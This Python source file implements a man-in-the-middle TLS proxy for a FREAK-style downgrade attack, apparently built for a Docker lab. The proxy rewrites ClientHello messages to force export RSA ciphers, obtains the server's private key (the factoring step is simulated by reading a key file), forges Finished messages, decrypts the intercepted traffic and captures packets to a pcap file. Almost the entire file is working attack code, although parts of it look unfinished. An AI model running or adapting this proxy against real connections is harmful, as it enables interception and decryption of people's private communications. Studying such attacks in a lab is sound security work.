import socket
import select
import time
import threading
import logging
import uuid
import json

from scapy.all import *  # noqa
from scapy.all import wrpcap, sniff
from scapy.layers.tls.all import *
from tls_session import TLSSession
from ssl2 import *

LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 8443  # Port for browser to connect to proxy
SERVER_HOST = 'server'  # Docker Compose service name or IP
SERVER_PORT = 8443      # Real server port

EXPORT_RSA_CIPHERS = [ 0x0003, 0x0008]
NON_EXPORT_RSA_CORRESPONDENT = {
    0x0003: 0x0004,
    0x0008: 0x0009 
}

ORIGINAL_CIPHERS = []

logger = logging.getLogger("mitm-proxy")
if not logger.hasHandlers():
    logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

broken_keys = {} # Map of n -> (e, d, p, q) for broken RSA keys

def parse_and_modify_clienthello(data, session: TLSSession | None = None):
    """Parse ClientHello and change supported ciphers to EXPORT only"""
    global ORIGINAL_CIPHERS
    hello = TLSClientHello(data)

    logger.info("TLS ClientHello detected")
    logger.info("Original ciphers: %s", hello.ciphers)
    # Modify the cipher suites to only include EXPORT ciphers
    if not ORIGINAL_CIPHERS:
        ORIGINAL_CIPHERS = hello.ciphers.copy()
    new_ciphers = []
    for cipher in hello.ciphers:
        if cipher in EXPORT_RSA_CIPHERS:
            new_ciphers.append(cipher)
        else:
            if NON_EXPORT_RSA_CORRESPONDENT[EXPORT_RSA_CIPHERS[0]] in hello.ciphers:
                new_ciphers.append(EXPORT_RSA_CIPHERS[0])
            else:
                new_ciphers.append(EXPORT_RSA_CIPHERS[1])


    # hello.ciphers = new_ciphers
    hello.ciphers[0] = 0x0008
    logger.info("Modified ciphers: %s", hello.ciphers)

    client_random = hello.gmt_unix_time.to_bytes(4, 'big') + hello.random_bytes

    if session is not None:
        try:
            session.client_hello = data
            session.tampered_client_hello = bytes(hello)
            session.client_random = client_random
        except Exception as e:
            logger.debug(f"Unable to store client hello in session: {e}")

    return bytes(hello)

def parse_serverhello(data, session: TLSSession | None = None):
    """Parse ServerHello and modify selected cipher to the corresponding non-export cipher (with normal RSA size), 
    to avoid UnkownCipher error if server chooses a cipher the client did not ask for"""

    hello = TLSServerHello(data)
    logger.info("TLS ServerHello detected")
    logger.info("Server selected cipher: %s", hello.cipher)

    if hello.cipher in EXPORT_RSA_CIPHERS and not hello.cipher in ORIGINAL_CIPHERS:
        original_cipher = NON_EXPORT_RSA_CORRESPONDENT[hello.cipher]
        logger.info(f"Server accepted downgraded cipher {hello.cipher}, replacing with corresponding cipher {original_cipher}")
        #hello.cipher = original_cipher
    else:
        logger.warning(f"Server did not accept downgraded cipher, selected {hello.cipher} instead")

    server_random = hello.gmt_unix_time.to_bytes(4, 'big') + hello.random_bytes

    if session is not None:
        try:
            session.server_hello = data
            session.tampered_server_hello = bytes(hello)
            session.server_random = server_random
        except Exception as e:
            logger.debug(f"Unable to store server hello in session: {e}")

    return bytes(hello)

def parse_clientkeyexchange(data, session: TLSSession | None = None):
    # first byte is handshake type
    # next three bytes are length
    # bytes 4-5 are encrypted pre-master secret length
    enc_pre_master_length = int.from_bytes(data[4:6], 'big')
    # next bytes are the encryoted pre-master secret itself
    enc_pre_master_secret = data[6:6+enc_pre_master_length]

    # logger.info(f"ClientKeyExchange PreMasterSecretLen={enc_pre_master_length}\nPreMasterSecret={enc_pre_master_secret.hex()}")

    if session is not None:
        try:
            session.enc_pre_master_secret = enc_pre_master_secret
            # Try compute/print master secret if we already have key and randoms
            session.try_print_master_secret(logger)
        except Exception as e:
            logger.debug(f"Unable to store client key exchange in session: {e}")

def parse_serverkeyexchange(data, session: TLSSession | None = None):
    # Parse the TLS record
    # logger.info("Parsing intercepted server key exchange data")
    # first byte is handshake type
    # next three bytes are length
    # bytes 4-5 are modulus length
    modulus_len = int.from_bytes(data[4:6], 'big')
    #next modulus_len bytes are modulus
    modulus = data[6:6+modulus_len]
    # next two bytes are exponent length
    exp_len = int.from_bytes(data[6+modulus_len:8+modulus_len], 'big')
    # next exp_len bytes are exponent
    public_exponent = data[8+modulus_len:8+modulus_len+exp_len]

    logger.info(f"ServerKeyExchange modulus_len={modulus_len} exponent_len={exp_len} modulus={modulus.hex()} public_exponent={public_exponent.hex()}")

    n = int.from_bytes(modulus, 'big')
    public_e = int.from_bytes(public_exponent, 'big')

    if session is not None:
        session.n = n
        session.e = public_e
        if n in broken_keys:
            session.d = broken_keys[n]['d']
            session.p = broken_keys[n]['p']
            session.q = broken_keys[n]['q']
        else:
            threading.Thread(target=break_rsa, args=(n, public_e, session)).start()

def break_rsa(n, e, session: TLSSession | None = None):
    global broken_keys
    d, p, q = read_private_key()     #TODO call math

    broken_keys[n] = {'e': e, 'd': d, 'p': p, 'q': q}
    if session is not None and session.n == n:
        session.d, session.p, session.q = d, p, q
        # Now that we have 'd', see if we can derive master secret
        session.try_print_master_secret(logger)
def read_private_key():
    # simulate key breaking delay
    time.sleep(10)
    with open("/keys/key.json", "r") as f:
        # d is stored as hex string
        key_data = json.load(f)
        d = int(key_data['d'], 16)
    return d, None, None

def recv_exact(sock, n):
    """Read exactly n bytes from a socket or return None if EOF."""
    buf = b''
    while len(buf) < n:
        # wait until socket is readable to avoid blocking forever
        ready = select.select([sock], [], [], 5.0)
        if not ready[0]:
            logger.warning("recv_exact timeout waiting for data")
            return None
        try:
            chunk = sock.recv(n - len(buf))
        except socket.timeout:
            logger.warning("recv_exact socket.timeout")
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


def read_record(sock):
    """Read a single record from `sock`.

    Supports regular TLS records (5-byte header) and older SSLv2-style records
    (commonly produced by legacy OpenSSL ClientHello). Uses MSG_PEEK to
    inspect the first bytes and decide which header format to read so we don't
    block waiting for 5 bytes when the peer actually sent a 2-byte SSLv2 header.

    Returns a tuple (hdr_bytes, payload_bytes, record_kind) where record_kind is
    'tls' or 'sslv2'. Returns (None, None, None) on EOF.
    """
    # Peek at the first byte to decide
    # wait until at least 1 byte is available
    ready = select.select([sock], [], [], 5.0)
    if not ready[0]:
        # no data within timeout
        return (None, None, None)
    try:
        first = sock.recv(1, socket.MSG_PEEK)
    except (BlockingIOError, InterruptedError, socket.timeout):
        return (None, None, None)
    if not first:
        return (None, None, None)
    b0 = first[0]

    # Normal TLS record (ContentType in 20..24) -> 5 byte header
    if 20 <= b0 <= 24:
        hdr = recv_exact(sock, 5)
        if not hdr:
            return (None, None, None)
        rec_len = int.from_bytes(hdr[3:5], 'big')
        payload = recv_exact(sock, rec_len)
        if payload is None:
            return (None, None, None)
        return (hdr, payload, 'tls')

    # Otherwise, assume SSLv2 style header. Try two-byte header first
    # Two-byte SSLv2 header: first byte has MSB set -> 15-bit length
    # ensure two bytes are available for SSLv2 header detection
    ready = select.select([sock], [], [], 5.0)
    if not ready[0]:
        return (None, None, None)
    try:
        prefix = sock.recv(2, socket.MSG_PEEK)
    except (BlockingIOError, InterruptedError, socket.timeout):
        return (None, None, None)
    if not prefix or len(prefix) < 2:
        return (None, None, None)

    if prefix[0] & 0x80:
        # 2-byte header
        h = recv_exact(sock, 2)
        if not h:
            return (None, None, None)
        length = ((h[0] & 0x7F) << 8) | h[1]
        body = recv_exact(sock, length)
        if body is None:
            return (None, None, None)
        return (h, body, 'sslv2')
    else:
        # 3-byte header (rare). Read 3 bytes and interpret length from next two bytes
        h = recv_exact(sock, 3)
        if not h or len(h) < 3:
            return (None, None, None)
        length = (h[1] << 8) | h[2]
        body = recv_exact(sock, length)
        if body is None:
            return (None, None, None)
        return (h, body, 'sslv2')


def tls_record_type_name(content_type):
    mapping = {
        20: 'change_cipher_spec',
        21: 'alert',
        22: 'handshake',
        23: 'application_data',
        24: 'heartbeat',
    }
    return mapping.get(content_type, f'unknown({content_type})')


def tls_handshake_type_name(hstype):
    mapping = {
        0: 'hello_request',
        1: 'client_hello',
        2: 'server_hello',
        11: 'certificate',
        12: 'server_key_exchange',
        13: 'certificate_request',
        14: 'server_hello_done',
        15: 'certificate_verify',
        16: 'client_key_exchange',
        20: 'finished'
    }
    return mapping.get(hstype, f'handshake_unknown({hstype})')

def forward(src, dst, direction, session: TLSSession | None = None):
    try:
        while True:
            hdr, payload, kind = read_record(src)
            if hdr is None:
                break
            orig_payload = payload

            if kind == 'tls':
                content_type = hdr[0]
                rec_len = int.from_bytes(hdr[3:5], 'big')
                rtype_name = tls_record_type_name(content_type)
                logger.info(f"Record {direction}: {rtype_name}, len={rec_len}")

                if direction == 'client->server' and session is not None and session.client_change_cipher_spec:
                    # try to decrypt
                    logger.info("Attempting to decrypt client->server data after ChangeCipherSpec")
                    decrypted = session.decrypt_tls(payload, from_client=True)
                    logger.info(f"Decrypted client->server data: {decrypted.hex() if decrypted else 'unable to decrypt'}")
                    orig_payload = payload
                    payload = decrypted if decrypted is not None else payload



                elif direction == 'server->client' and session is not None and session.server_change_cipher_spec:
                    # try to decrypt
                    logger.info("Attempting to decrypt server->client data after ChangeCipherSpec")
                    decrypted = session.decrypt_tls(payload, from_client=False)
                    logger.info(f"Decrypted server->client data: {decrypted.hex() if decrypted else 'unable to decrypt'}")
                    orig_payload = payload
                    payload = decrypted if decrypted is not None else payload

                # If it's a handshake record, try to parse handshake messages inside
                if rtype_name == 'handshake':
                    # handshake messages can be concatenated; walk them
                    offset = 0
                    while offset + 4 <= len(payload):
                        htype = payload[offset]
                        hlen = int.from_bytes(payload[offset+1:offset+4], 'big')
                        hname = tls_handshake_type_name(htype)
                        logger.info(f"  Handshake message: {hname}, len={hlen}")
                        if hname == 'client_hello':
                            new_payload = parse_and_modify_clienthello(payload[offset:offset+4+hlen], session)
                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
                            session.handshake_messages_server_view += new_payload
                            orig_payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                        elif hname == 'server_hello':
                            new_payload = parse_serverhello(payload[offset:offset+4+hlen], session)
                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
                            session.handshake_messages_client_view += new_payload
                            orig_payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                        elif hname == 'server_key_exchange':
                            parse_serverkeyexchange(payload[offset:offset+4+hlen], session)
                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
                        elif hname == 'client_key_exchange':
                            parse_clientkeyexchange(payload[offset:offset+4+hlen], session)
                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
                        elif hname == 'finished':
                            logger.info(f"Finished message detected: {payload[offset:offset+4+hlen].hex()}")
                            if direction == 'client->server':
                                session.handshake_messages_client_view += payload[offset:offset+4+hlen]
                            new_verify = session.compute_verify_data(from_client=(direction=='client->server'))
                            # first byte is handshake type, next 3 bytes are length
                            new_payload = payload[:offset+4] + new_verify
                            logger.info(f"New finished message: {new_payload[offset:offset+4+hlen].hex()}")
                            orig_payload = session.re_encrypt_first_tls(logger, new_payload, from_client=(direction=='client->server'))
                            break
                        else:
                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]

                        #advance to next handshake message
                        offset += 4 + hlen
                        if hlen == 0:
                            break

                elif rtype_name == 'change_cipher_spec':
                    if direction == 'client->server':
                        session.client_change_cipher_spec = True
                    else:
                        session.server_change_cipher_spec = True

            else:  # sslv2
                rec_len = len(payload)
                logger.info(f"Record {direction}: sslv2, len={rec_len}")
                #try to parse sslv2 handshake messages
                if len(payload) > 0:
                    msg_type = payload[0]
                    if msg_type == 1:  # ClientHello
                        ciphers = parse_sslv2_clienthello(payload)
                        logger.info(f"SSLv2 ClientHello ciphers: {ciphers}")
                        # modify clienthello to only offer EXP-RC4-MD5 cipher
                        new_payload = modify_sslv2_clienthello(payload)
                        orig_payload = new_payload
                    elif msg_type == 4:  # ServerHello
                        chosen = parse_sslv2_serverhello(payload)
                        logger.info(f"SSLv2 ServerHello chosen: {chosen}")

            dst.sendall(hdr + orig_payload)
    except Exception as e:
        logger.warning(f"Exception in forwarding ({direction}): {e}")
    finally:
        src.close()
        dst.close()

def handle_client(client_sock, client_addr):
    try:
        server_sock = socket.create_connection((SERVER_HOST, SERVER_PORT))
        logger.info(f"Accepted connection from {client_addr}, forwarding to {SERVER_HOST}:{SERVER_PORT}")

        # Create session with unique ID and context
        session_id = f"{int(time.time())}-{uuid.uuid4().hex[:8]}"
        session = TLSSession(session_id=session_id)
        session.client_addr = client_addr

        # Start forwarding threads with session context
        t1 = threading.Thread(target=forward, args=(client_sock, server_sock, 'client->server', session))
        t2 = threading.Thread(target=forward, args=(server_sock, client_sock, 'server->client', session))
        t1.start(); t2.start()

        # Wait for both directions to complete to close the session cleanly
        t1.join(); t2.join()
    except Exception as e:
        logger.error(f"Error handling client {client_addr}: {e}")
        client_sock.close()

def packet_callback(pkt):
    #save to pcap file
    wrpcap(f"/pcap/freak_mitm.pcap", pkt, append=True)

def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind((LISTEN_HOST, LISTEN_PORT))
    listen_sock.listen(5)
    logger.info(f"Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_HOST}:{SERVER_PORT}")

    # setup a packet sniffer to capture all traffic on eth0 and save to pcap file
    sniffer = threading.Thread(target=sniff, kwargs={
        'iface': 'eth0',
        'prn': packet_callback,
        'store': False
    })
    sniffer.start()

    while True:
        client_sock, addr = listen_sock.accept()
        logger.info(f"Accepted connection from {addr}")
        threading.Thread(target=handle_client, args=(client_sock, addr)).start()

if __name__ == '__main__':
    main()